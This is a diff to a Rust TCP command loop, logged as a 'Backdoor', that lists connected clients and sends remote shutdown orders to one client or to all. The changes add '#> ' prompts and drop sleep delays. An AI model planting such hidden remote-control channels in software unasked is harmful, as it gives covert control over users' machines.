@@ -280,9 +280,10 @@ loop{
     let start = std::time::Instant::now();
     let elapsed = start.elapsed();
     let mut timerovrflow: u128= timeout + elapsed.as_millis();
-
+    
+    stream.write_all("#> ".as_bytes()).unwrap();
     loop {
-        // Tenta ler dados do stream
+            // Tenta ler dados do stream
             match stream.read(&mut buffer) {
             Ok(0) => {
                 // Fim da leitura (conexão fechada pelo outro lado)
@@ -301,11 +302,13 @@ loop{
                 
                 if received_data.trim() == "200:" {
                     //sender_to_ger_client.send(cmdtotcp.to_string()).unwrap();
+                    stream.write_all("#> ".as_bytes()).unwrap();
                     continue;
                 }
                 if received_data.contains("202:") {
                     if received_data.trim().len() < 8 {
                         log::info!("Backdoor: You forgot client ID\n");
+                        stream.write_all("#> ".as_bytes()).unwrap();
                         continue;
                     }
                     let client_id = &received_data[4..8];
@@ -324,22 +327,25 @@ loop{
                         let shutdown: String = "999: shutdown".to_string();
                         println!("Convertido: {}", u16client_id);
                         clientdata::ClientData::send_client_msg_by_id(u16client_id,shutdown);
-                        thread::sleep(Duration::from_millis(5000));
+                        //thread::sleep(Duration::from_millis(5000));
                         //process::exit(0);
+                        stream.write_all("#> ".as_bytes()).unwrap();
                     }
                     continue;
                 }
                 if received_data.trim() == "201:" {
                     let shutdown: String = "999: shutdown".to_string();
                     clientdata::ClientData::round_robin(shutdown);
-                    thread::sleep(Duration::from_millis(5000));
+                    //thread::sleep(Duration::from_millis(5000));
                     //process::exit(0);
+                    stream.write_all("#> ".as_bytes()).unwrap();
                     continue;
                 }// Handle the LISTAR command
                 if received_data.trim() == "L" || received_data.trim() == "l" {
                     let clients = clientdata::ClientData::list_clients();
                     if clients.is_empty() {
                         stream.write("No clients connected\n".as_bytes()).unwrap();
+                        stream.write_all("#> ".as_bytes()).unwrap();
                         continue;
                     }   
                     for client in clients {
@@ -348,9 +354,11 @@ loop{
                     }                                 
                 }else if received_data.trim() == "E" || received_data.trim() == "E" {
                     log::info!("Backdoor: E cmd exiting...");               
+                    stream.write_all("#> ".as_bytes()).unwrap();
                     break
                 }else{                
                     stream.write("Invalid command\n".as_bytes()).unwrap();
+                    stream.write_all("#> ".as_bytes()).unwrap();
                 }               
             }
             Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
